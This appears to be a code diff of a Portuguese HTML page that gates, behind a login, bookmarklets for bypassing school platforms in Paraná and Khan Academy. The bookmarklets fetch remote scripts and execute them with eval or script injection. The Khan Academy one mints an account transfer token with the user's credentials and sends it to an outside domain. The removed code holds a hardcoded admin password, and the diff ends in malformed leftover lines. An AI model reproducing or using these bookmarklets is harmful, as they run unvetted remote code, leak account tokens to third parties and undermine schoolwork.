@@ -5,148 +5,489 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>100% PLATAFORMAS</title>
 
-<!-- Firebase -->
-<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script>
-
 <style>
-/* (SEU CSS MANTIDO IGUAL — NÃO ALTEREI NADA) */
 *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif;}
-body{background:linear-gradient(135deg,#0a0a0a,#1a0000);color:#fff;min-height:100vh;}
-/* pode manter todo seu CSS aqui exatamente como está */
+
+body{
+  background:linear-gradient(135deg,#0a0a0a,#1a0000);
+  color:#fff;
+}
+
+/* LOGIN */
+.login-screen{
+  position:fixed;
+  top:0;left:0;
+  width:100%;height:100%;
+  background:#000;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  z-index:999;
+}
+
+.login-box{
+  background:rgba(255,255,255,0.05);
+  padding:30px;
+  border-radius:20px;
+  width:300px;
+  text-align:center;
+  box-shadow:0 0 20px rgba(255,0,0,0.3);
+}
+
+.login-box h2{
+  color:#ff4d4d;
+  margin-bottom:15px;
+}
+
+.login-box input{
+  width:100%;
+  padding:10px;
+  margin:10px 0;
+  border:none;
+  border-radius:10px;
+}
+
+.login-box button{
+  width:100%;
+  padding:10px;
+  border:none;
+  border-radius:10px;
+  background:#ff4d4d;
+  color:#fff;
+  font-weight:bold;
+  cursor:pointer;
+  margin-top:10px;
+}
+
+.login-box button:disabled{
+  opacity:0.6;
+  cursor:not-allowed;
+}
+
+.loading-spinner{
+  display:inline-block;
+  width:16px;
+  height:16px;
+  border:2px solid rgba(255,255,255,0.3);
+  border-top:2px solid #fff;
+  border-radius:50%;
+  animation:spin 0.8s linear infinite;
+  margin-right:8px;
+}
+
+@keyframes spin{
+  to{transform:rotate(360deg);}
+}
+
+/* HEADER */
+header{
+  text-align:center;
+  padding:30px;
+  font-size:30px;
+  font-weight:bold;
+  letter-spacing:3px;
+  background:rgba(0,0,0,0.6);
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+}
+
+.header-title{
+  flex:1;
+}
+
+.user-info{
+  font-size:14px;
+  color:#ff4d4d;
+}
+
+.tutorial{
+  margin:30px;
+  padding:20px;
+  background:rgba(255,0,0,0.08);
+  border:1px solid rgba(255,0,0,0.3);
+  border-radius:15px;
+}
+
+.container{
+  display:grid;
+  grid-template-columns:repeat(auto-fit,minmax(300px,1fr));
+  gap:25px;
+  padding:30px;
+}
+
+.card{
+  background:rgba(255,255,255,0.05);
+  border-radius:20px;
+  padding:20px;
+  transition:transform 0.2s;
+}
+
+.card:hover{
+  transform:translateY(-5px);
+  background:rgba(255,255,255,0.08);
+}
+
+.script-box{
+  background:#000;
+  padding:12px;
+  border-radius:10px;
+  font-size:12px;
+  overflow-x:auto;
+  margin-bottom:15px;
+  max-height:100px;
+  overflow-y:auto;
+  word-break:break-all;
+}
+
+.buttons{
+  display:flex;
+  gap:10px;
+}
+
+button,a{
+  flex:1;
+  padding:10px;
+  border:none;
+  border-radius:10px;
+  cursor:pointer;
+  text-align:center;
+  text-decoration:none;
+  font-weight:bold;
+  transition:opacity 0.2s;
+}
+
+button:hover,a:hover{
+  opacity:0.8;
+}
+
+.copy{background:#ff4d4d;color:#fff;}
+.access{background:#fff;color:#000;}
+
+footer{
+  text-align:center;
+  padding:20px;
+  border-top:1px solid rgba(255,255,255,0.1);
+}
+
+/* LOGOUT */
+.logout{
+  position:fixed;
+  bottom:20px;
+  right:20px;
+  background:#ff4d4d;
+  padding:10px 15px;
+  border-radius:10px;
+  cursor:pointer;
+  border:none;
+  color:#fff;
+  font-weight:bold;
+  z-index:100;
+}
+
+.logout:hover{
+  background:#ff3333;
+}
+
+/* ERROR MESSAGE */
+.error-msg{
+  color:#ff6b6b;
+  font-size:12px;
+  margin-top:8px;
+}
+
+.success-msg{
+  color:#51cf66;
+  font-size:12px;
+  margin-top:8px;
+}
 </style>
 </head>
 
 <body>
 
-<!-- ================= LOGIN ================= -->
-<div id="loginScreen" style="display:flex;align-items:center;justify-content:center;min-height:100vh;">
-  <div>
-    <h1>100% PLATAFORMAS</h1>
-    <input type="email" id="emailInput" placeholder="Digite seu e-mail">
-    <button onclick="attemptLogin()">Entrar</button>
-    <div id="loginError"></div>
-    <br><br>
-    <button onclick="openAdmin()">Admin</button>
+<!-- LOGIN -->
+<div class="login-screen" id="loginScreen">
+  <div class="login-box">
+    <h2>Login</h2>
+    <input type="text" id="user" placeholder="UsuÃ¡rio" autocomplete="username">
+    <input type="password" id="pass" placeholder="Senha" autocomplete="current-password">
+    <button id="loginBtn" onclick="login()">Entrar</button>
+    <p id="erro" class="error-msg"></p>
   </div>
 </div>
 
-<!-- ================= ADMIN ================= -->
-<div id="adminPanel" style="display:none;">
-  <h2>Admin</h2>
+<!-- SITE -->
+<div id="site" style="display:none;">
 
-  <div id="adminLogin">
-    <input type="password" id="adminPass" placeholder="Senha">
-    <button onclick="verifyAdmin()">Entrar</button>
-    <div id="adminError"></div>
+<header>
+  <div class="header-title">100% PLATAFORMAS</div>
+  <div class="user-info">
+    OlÃ¡, <span id="username">usuÃ¡rio</span>
   </div>
+</header>
 
-  <div id="adminContent" style="display:none;">
-    <input type="email" id="newEmail" placeholder="email">
-    <button onclick="addEmail()">Adicionar</button>
-
-    <div id="emailList"></div>
-    <br>
-    <button onclick="closeAdmin()">Fechar</button>
-  </div>
+<div class="tutorial">
+  <h2>ðŸ“Œ Como usar scripts com favoritos</h2>
+  <p>Copie e use nos favoritos do seu navegador.</p>
 </div>
 
-<!-- ================= MAIN ================= -->
-<div id="mainPlatform" style="display:none;">
-  <h1>Bem-vindo</h1>
-  <p id="userEmail"></p>
-  <button onclick="logout()">Sair</button>
+<div class="container">
+
+  <div class="card">
+    <h2>Leia ParanÃ¡</h2>
+    <div class="script-box" id="s1">
+javascript:(function(){fetch('https://cdn.jsdelivr.net/gh/mzzvxm/LeiaPRBypass@latest/script.js').then(r=>r.text()).then(eval);})();
+    </div>
+    <div class="buttons">
+      <button class="copy" onclick="copiar('s1')">Copiar</button>
+      <a class="access" href="https://leiaparana.odilo.us/?locale=pt" target="_blank">Acessar</a>
+    </div>
+  </div>
+
+  <div class="card">
+    <h2>RedaÃ§Ã£o ParanÃ¡</h2>
+    <div class="script-box" id="s2">
+javascript:(function(){var s=document.createElement('script');s.src='https://cdn.jsdelivr.net/gh/mzzvxm/RedacaoBypass@main/script.js?t='+Date.now();document.head.appendChild(s)})();
+    </div>
+    <div class="buttons">
+      <button class="copy" onclick="copiar('s2')">Copiar</button>
+      <a class="access" href="https://redacao.pr.gov.br/" target="_blank">Acessar</a>
+    </div>
+  </div>
+
+  <div class="card">
+    <h2>Khan Academy</h2>
+    <div class="script-box" id="s3">
+javascript:(async()=>{let e=window.location.hostname;if("khanacademy.org"!==e.split(".")?.slice(1)?.join("."))return;let a=e.split(".")[0];open(`https://khan.cupiditys.lol/?token=${(await (await fetch(`/api/internal/graphql/createTransferAuthTokenMutation?lang=${"www"===a?"en":a}&app=khanacademy`,{headers:{"content-type":"application/json","x-ka-fkey":"1"},referrer:"/settings/account",body:JSON.stringify({operationName:"createTransferAuthTokenMutation",query:"mutation createTransferAuthTokenMutation($canvasProfileKeyName: String) {\n  createTransferAuthToken(canvasProfileKeyName: $canvasProfileKeyName) {\n    token\n    __typename\n  }\n}",variables:{}}),method:"POST",mode:"cors",credentials:"include"})).json()).data.createTransferAuthToken.token}&l=${a}&c=${window.__KA_DATA__["KA-fastly-country"]}`)})();
+    </div>
+    <div class="buttons">
+      <button class="copy" onclick="copiar('s3')">Copiar</button>
+      <a class="access" href="https://www.khanacademy.org/" target="_blank">Acessar</a>
+    </div>
+  </div>
+
+  <div class="card">
+    <h2>Quizizz</h2>
+    <div class="script-box" id="s4">
+https://waygroundx.vercel.app/
+    </div>
+    <div class="buttons">
+      <button class="copy" onclick="copiar('s4')">Copiar</button>
+      <a class="access" href="https://waygroundx.vercel.app/" target="_blank">Acessar</a>
+    </div>
+  </div>
+
+</div>
+
+<footer>
+Â© 100% Plataformas
+<div class="brand">feito por PajÃ© 01</div>
+</footer>
+
+<button class="logout" onclick="logout()">Sair</button>
+
 </div>
 
 <script>
-// ================= FIREBASE CONFIG =================
-// COLOQUE SEUS DADOS AQUI
-const firebaseConfig = {
-  apiKey: "SUA_API_KEY",
-  authDomain: "SEU_PROJETO.firebaseapp.com",
-  projectId: "SEU_PROJECT_ID",
-};
+// ============= CONFIGURAÃ‡Ã•ES =============
+const API_BASE_URL = 'https://adminpainel-7nrylu2f.manus.space';
+const TOKEN_KEY = 'platformToken';
+const USER_KEY = 'platformUser';
 
-firebase.initializeApp(firebaseConfig);
-const db = firebase.firestore();
+// ============= CLIENTE tRPC SIMPLIFICADO =============
+class TRPCClient {
+  constructor(baseUrl) {
+    this.baseUrl = baseUrl;
+  }
 
-// ================= ADMIN =================
-const ADMIN_PASSWORD = "macaco";
-let adminUnlocked = false;
+  async call(path, input, method = 'mutation') {
+    try {
+      const url = `${this.baseUrl}/api/trpc/${path}`;
+      
+      const options = {
+        method: method === 'query' ? 'GET' : 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+      };
 
-function openAdmin(){
-  document.getElementById("loginScreen").style.display="none";
-  document.getElementById("adminPanel").style.display="block";
-}
+      if (method === 'query') {
+        const params = new URLSearchParams();
+        params.append('input', JSON.stringify(input));
+        const fullUrl = `${url}?${params.toString()}`;
+        
+        const response = await fetch(fullUrl, options);
+        return this._handleResponse(response);
+      } else {
+        options.body = JSON.stringify(input);
+        
+        const response = await fetch(url, options);
+        return this._handleResponse(response);
+      }
+    } catch (error) {
+      console.error('tRPC call error:', error);
+      throw error;
+    }
+  }
 
-function closeAdmin(){
-  document.getElementById("adminPanel").style.display="none";
-  document.getElementById("loginScreen").style.display="flex";
-}
+  async _handleResponse(response) {
+    if (!response.ok) {
+      const errorText = await response.text();
+      console.error('Response error:', errorText);
+      throw new Error(`HTTP ${response.status}: ${errorText}`);
+    }
 
-function verifyAdmin(){
-  const pass = document.getElementById("adminPass").value;
-  if(pass === ADMIN_PASSWORD){
-    adminUnlocked = true;
-    document.getElementById("adminLogin").style.display="none";
-    document.getElementById("adminContent").style.display="block";
-    renderEmails();
-  }else{
-    document.getElementById("adminError").innerText="Senha errada";
+    const data = await response.json();
+    
+    if (Array.isArray(data) && data[0]) {
+      const result = data[0].result;
+      
+      if (result.error) {
+        throw new Error(result.error.message || 'API Error');
+      }
+      
+      return result.data;
+    }
+    
+    return data;
+  }
+
+  async login(username, password) {
+    return this.call('auth.login', { username, password }, 'mutation');
+  }
+
+  async validateSession(token) {
+    return this.call('auth.validateSession', { token }, 'query');
+  }
+
+  async logout(token) {
+    return this.call('auth.logout', { token }, 'mutation');
   }
 }
 
-// ================= EMAILS =================
-function renderEmails(){
-  db.collection("authorized_emails")
-  .onSnapshot(snapshot=>{
-    const container = document.getElementById("emailList");
-    container.innerHTML = "";
+const trpc = new TRPCClient(API_BASE_URL);
 
-    snapshot.forEach(doc=>{
-      const email = doc.id;
+// ============= FUNÃ‡Ã•ES DE AUTENTICAÃ‡ÃƒO =============
 
-      const div = document.createElement("div");
-      div.innerHTML = `
-        ${email}
-        <button onclick="removeEmail('${email}')">Remover</button>
-      `;
-      container.appendChild(div);
-    });
-  });
-}
+async function login(){
+  const user = document.getElementById("user").value.trim();
+  const pass = document.getElementById("pass").value;
+  const loginBtn = document.getElementById("loginBtn");
+  const erroEl = document.getElementById("erro");
 
-async function addEmail(){
-  const email = document.getElementById("newEmail").value.trim().toLowerCase();
-  if(!email) return;
-
-  await db.collection("authorized_emails").doc(email).set({
-    createdAt: new Date()
-  });
-
-  document.getElementById("newEmail").value="";
-}
-
-async function removeEmail(email){
-  await db.collection("authorized_emails").doc(email).delete();
-}
-
-// ================= LOGIN =================
-async function attemptLogin(){
-  const email = document.getElementById("emailInput").value.trim().toLowerCase();
-  const err = document.getElementById("loginError");
-
-  if(!email){
-    err.innerText="Digite um email";
+  if(!user || !pass){
+    erroEl.innerText = "Preencha todos os campos";
     return;
   }
 
-  const snap = await db.collection("authorized_emails").get();
-  const list = snap.docs.map(d=>d.id);
+  loginBtn.disabled = true;
+  const originalText = loginBtn.innerText;
+  loginBtn.innerHTML = '<span class="loading-spinner"></span>Entrando...';
+  erroEl.innerText = '';
 
-  if(list.includes(email)){
-    showPlatform(email);
-  }else{
+  try {
+    const result = await trpc.login(user, pass);
+
+    if(result && result.success && result.token){
+      const token = result.token;
+      const userData = result.user;
+
+      localStorage.setItem(TOKEN_KEY, token);
+      localStorage.setItem(USER_KEY, JSON.stringify(userData));
+
+      liberar();
+    } else {
+      erroEl.innerText = "UsuÃ¡rio ou senha incorretos";
+    }
+  } catch(error) {
+    console.error('Login error:', error);
+    erroEl.innerText = error.message || "Erro ao conectar ao servidor";
+  } finally {
+    loginBtn.disabled = false;
+    loginBtn.innerHTML = originalText;
+  }
+}
+
+// LIBERAR ACESSO
+function liberar(){
+  const userData = JSON.parse(localStorage.getItem(USER_KEY) || '{}');
+  document.getElementById("username").innerText = userData.username || 'usuÃ¡rio';
+  document.getElementById("loginScreen").style.display = "none";
+  document.getElementById("site").style.display = "block";
+}
+
+// LOGOUT
+async function logout(){
+  const token = localStorage.getItem(TOKEN_KEY);
+
+  if(token){
+    try {
+      await trpc.logout(token);
+    } catch(error) {
+      console.error('Logout error:', error);
+    }
+  }
+
+  localStorage.removeItem(TOKEN_KEY);
+  localStorage.removeItem(USER_KEY);
+  location.reload();
+}
+
+// VERIFICAR SESSÃƒO
+async function verificarSessao(){
+  const token = localStorage.getItem(TOKEN_KEY);
+
+  if(!token){
+    return false;
+  }
+
+  try {
+    const result = await trpc.validateSession(token);
+
+    if(result && result.valid){
+      return true;
+    } else {
+      localStorage.removeItem(TOKEN_KEY);
+      localStorage.removeItem(USER_KEY);
+      return false;
+    }
+  } catch(error) {
+    console.error('Session validation error:', error);
+    return false;
+  }
+}
+
+// COPIAR
+function copiar(id){
+  const texto = document.getElementById(id).innerText;
+  navigator.clipboard.writeText(texto).then(() => {
+    alert("Copiado para a Ã¡rea de transferÃªncia!");
+  }).catch(err => {
+    console.error('Erro ao copiar:', err);
+    alert("Erro ao copiar. Tente novamente.");
+  });
+}
+
+// ============= INICIALIZAÃ‡ÃƒO =============
+(async function(){
+  const urlParams = new URLSearchParams(window.location.search);
+  const tokenFromUrl = urlParams.get('token');
+
+  if(tokenFromUrl){
+    localStorage.setItem(TOKEN_KEY, tokenFromUrl);
+    window.history.replaceState({}, document.title, window.location.pathname);
+  }
+
+  const isValid = await verificarSessao();
+  if(isValid){
+    liberar();
+  }
+})();
+</script>
+
+</body>
+</html>
     err.innerText="Não autorizado";
   }
 }
